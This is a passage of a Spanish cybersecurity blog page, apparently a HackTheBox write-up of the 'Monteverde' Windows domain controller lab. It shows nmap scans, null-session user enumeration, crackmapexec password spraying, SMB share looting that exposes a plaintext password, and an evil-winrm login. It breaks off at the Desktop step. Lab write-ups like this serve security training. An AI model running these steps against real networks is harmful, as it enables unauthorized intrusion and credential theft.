@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Monteverde - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Maquina Monteverde - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Monteverde de hackthebox una maquina windows de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un DC donde obtendremos usuarios a traves de rpc y con ayuda de crackmapexec mediante un ataque de fuerza bruta conseguiremos credenciales validas, que nos permitiran listar los recursos compartidos del sistema y conectarnos con otras credenciales al sistema y finalmente abusaremos del grupo Azure Admins para explotar un Azure AD Sync con lo que nos haremos con las credenciales administrativas del dominio. Maquina interesenta asi que vamos a darle!." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Monteverde de hackthebox una maquina windows de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un DC donde obtendremos usuarios a traves de rpc y con ayuda de crackmapexec mediante un ataque de fuerza bruta conseguiremos credenciales validas, que nos permitiran listar los recursos compartidos del sistema y conectarnos con otras credenciales al sistema y finalmente abusaremos del grupo Azure Admins para explotar un Azure AD Sync con lo que nos haremos con las credenciales administrativas del dominio. Maquina interesenta asi que vamos a darle!." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Monteverde" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Monteverde" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Monteverde/monteverde.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-13T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Monteverde/monteverde.png" />
+<meta property="twitter:title" content="Maquina Monteverde - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-10-13T00:00:00-05:00","datePublished":"2023-10-13T00:00:00-05:00","description":"El dia de hoy vamos a resolver Monteverde de hackthebox una maquina windows de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un DC donde obtendremos usuarios a traves de rpc y con ayuda de crackmapexec mediante un ataque de fuerza bruta conseguiremos credenciales validas, que nos permitiran listar los recursos compartidos del sistema y conectarnos con otras credenciales al sistema y finalmente abusaremos del grupo Azure Admins para explotar un Azure AD Sync con lo que nos haremos con las credenciales administrativas del dominio. Maquina interesenta asi que vamos a darle!.","headline":"Maquina Monteverde - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Monteverde/monteverde.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Monteverde"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Monteverde"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Monteverde - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-10-13">13 Oct 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Monteverde/monteverde.png" alt="Maquina Monteverde - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Monteverde</code> de <code>hackthebox</code> una maquina <code>windows</code> de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un <code>DC</code> donde obtendremos usuarios a traves de <code>rpc</code> y con ayuda de <code>crackmapexec</code> mediante un ataque de fuerza bruta conseguiremos credenciales validas, que nos permitiran listar los recursos compartidos del sistema y conectarnos con otras credenciales al sistema y finalmente abusaremos del grupo <code>Azure Admins</code> para explotar un <code>Azure AD Sync</code> con lo que nos haremos con las credenciales administrativas del dominio.</p>
+
+<p>Maquina interesenta asi que vamos a darle!.</p>
+
+<p>Comenzamos como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Monteverde
+❯ ls
+
+ Monteverde
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.172
+PING 10.10.10.172 (10.10.10.172) 56(84) bytes of data.
+64 bytes from 10.10.10.172: icmp_seq=1 ttl=127 time=147 ms
+
+--- 10.10.10.172 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 147.473/147.473/147.473/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>127</code> y por proximidad seria correspondiente a una maquina <code>windows</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.172 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 17:17 -05
+Initiating SYN Stealth Scan at 17:17
+Scanning 10.10.10.172 [65535 ports]
+Discovered open port 139/tcp on 10.10.10.172
+Discovered open port 53/tcp on 10.10.10.172
+Discovered open port 445/tcp on 10.10.10.172
+Discovered open port 135/tcp on 10.10.10.172
+Discovered open port 49676/tcp on 10.10.10.172
+Discovered open port 593/tcp on 10.10.10.172
+Discovered open port 49667/tcp on 10.10.10.172
+Discovered open port 49674/tcp on 10.10.10.172
+Discovered open port 9389/tcp on 10.10.10.172
+Discovered open port 5985/tcp on 10.10.10.172
+Discovered open port 3269/tcp on 10.10.10.172
+Discovered open port 636/tcp on 10.10.10.172
+Discovered open port 464/tcp on 10.10.10.172
+Discovered open port 49673/tcp on 10.10.10.172
+Discovered open port 64934/tcp on 10.10.10.172
+Discovered open port 389/tcp on 10.10.10.172
+Discovered open port 88/tcp on 10.10.10.172
+Discovered open port 49697/tcp on 10.10.10.172
+Discovered open port 3268/tcp on 10.10.10.172
+Completed SYN Stealth Scan at 17:18, 40.69s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.172
+Host is up, received user-set (0.18s latency).
+Scanned at 2023-10-13 17:17:44 -05 for 40s
+Not shown: 65516 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49673/tcp open  unknown          syn-ack ttl 127
+49674/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49697/tcp open  unknown          syn-ack ttl 127
+64934/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 40.80 seconds
+           Raw packets sent: 196591 (8.650MB) | Rcvd: 39 (1.716KB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49697,64934 10.10.10.172 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 17:19 -05
+Nmap scan report for 10.10.10.172
+Host is up (0.66s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-13 22:19:56Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+64934/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2023-10-13T22:20:53
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 113.74 seconds
+</code></pre>
+
+<p>Entre los puertos abiertos mas relevantes podemos visualizar:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>53</td>
+      <td>DNS</td>
+      <td>Simple DNS Plus</td>
+    </tr>
+    <tr>
+      <td>88</td>
+      <td>KERBEROS</td>
+      <td>Microsoft Windows Kerberos</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td>NETBIOS</td>
+      <td>Microsoft Windows netbios-ssn</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMB</td>
+      <td>?</td>
+    </tr>
+    <tr>
+      <td>3268</td>
+      <td>LDAP</td>
+      <td>Microsoft Windows Active Directory LDAP</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>WINRM</td>
+      <td>Microsoft HTTPAPI httpd 2.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotacion">EXPLOTACION <a href="#explotacion">#</a></h2>
+
+<p>Como vemos que el puerto <code>445</code> esta abierto, con <code>crackpamexec</code> vamos a tratar de enumerar a lo que nos enfrentamos.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.172
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+</code></pre>
+
+<p>Podemos ver que estamos ante un <code>Windows 10</code>, ahora tambien vemos el dominio asociado para agregarlo a nuestro <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.172 MEGABANK.LOCAL" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Como nos enfrentamos contra un <code>Domain Controller</code> podemos tratar de enumerar usuarios validos con <code>rpclient</code> a traves de un <code>null session</code>.</p>
+
+<pre><code class="language-bash">❯ rpcclient -U '' 10.10.10.172 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]'
+Guest
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+</code></pre>
+<p>Guardamos las credenciales en un archivo de nombre <code>users.txt</code> y podemos tratar de efectuar un <code>ASREProast Attack</code> para tratar de obtener un <code>TGT - ticket granting ticket</code>, pero no da resultado.</p>
+
+<pre><code class="language-bash">❯ GetNPUsers.py -no-pass -usersfile users.txt MEGABANK.LOCAL/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+
+<p>Ahora bien en vista que tenemos un listado potencial de usuarios validos podemos tratar de realizar fuerza bruta con <code>crackmapexec</code> usando la misma lista de usuarios como posibles contraseñas.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-netapp STATUS_LOGON_FAILURE 
+</code></pre>
+
+<p>Obtenemos unas credenciales validas <code>SABatchJobs:SABatchJobs</code> y con estas podemos tratar de enumerar los recursos compartidos.</p>
+
+<pre><code class="language-bash">❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
+[+] IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	azure_uploads                                     	READ ONLY	
+	C$                                                	NO ACCESS	Default share
+	E$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	users$                                            	READ ONLY	
+</code></pre>
+
+<p>Si vamos a las ruta de <code>users$</code> encontramos dentro del directorio <code>mhope</code> un archivo <code>azure.xml</code>.</p>
+
+<pre><code class="language-bash">❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$/mhope'
+[+] IP: 10.10.10.172:445	Name: MEGABANK.LOCAL                                    
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	users$                                            	READ ONLY	
+	.\users$mhope\*
+	dr--r--r--                0 Fri Jan  3 08:41:18 2020	.
+	dr--r--r--                0 Fri Jan  3 08:41:18 2020	..
+	fw--w--w--             1212 Fri Jan  3 09:59:24 2020	azure.xml
+</code></pre>
+
+<p>Nos descargamos el archivo y al leerlo vemos una nueva contraseña <code>4n0therD4y@n0th3r$</code></p>
+
+<pre><code class="language-bash">❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download 'users$/mhope/azure.xml'
+[+] Starting download: users$\mhope\azure.xml (1212 bytes)
+[+] File output to: /home/fmiracle/machines/Monteverde/content/10.10.10.172-users_mhope_azure.xml
+❯ mv 10.10.10.172-users_mhope_azure.xml azure.xml
+❯ /bin/cat azure.xml
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj RefId="0"&gt;
+    &lt;TN RefId="0"&gt;
+      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;DT N="StartDate"&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;DT N="EndDate"&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+      &lt;G N="KeyId"&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
+      &lt;S N="Password"&gt;4n0therD4y@n0th3r$&lt;/S&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;#
+</code></pre>
+
+<p>Ya que obtuvimos una nueva credencial, vamos a hacer lo mismo que antes con <code>Crackmapexec</code> pero esta vez con esta contraseña.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+</code></pre>
+
+<p>Obtenemos nuevas credenciales validas <code>mhope:4n0therD4y@n0th3r$</code> y como vimos que el puerto <code>5085</code> se encuentra abierto, podemos tratar de conectarnos con <code>evil-winrm</code></p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; whoami
+megabank\mhope
+</code></pre>
+
+<p>Una vez como el usuario <code>mhpe</code>, podemos dirigirnos a su directorio personal y visualizar la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; cd ..\Desktop
